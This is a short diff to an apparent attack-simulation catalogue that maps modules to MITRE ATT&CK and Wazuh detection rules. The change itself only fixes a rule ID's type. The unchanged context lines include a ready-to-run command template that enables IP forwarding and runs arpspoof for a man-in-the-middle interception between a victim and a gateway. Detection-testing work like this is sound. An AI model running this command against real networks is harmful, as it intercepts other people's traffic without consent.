@@ -151,7 +151,7 @@
     "module": "LAN",
     "mitre_id": "T1557",
     "risk_level": "CRITICAL",
-    "wazuh_rule_id": "100504b",
+    "wazuh_rule_id": 100504,
     "description": "Intercepta tráfico entre víctima y gateway activando IP forwarding para MitM silencioso bidireccional.",
     "command": "sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward && arpspoof -i {{interface}} -t {{target}} {{gateway}}'",
     "parameters": [
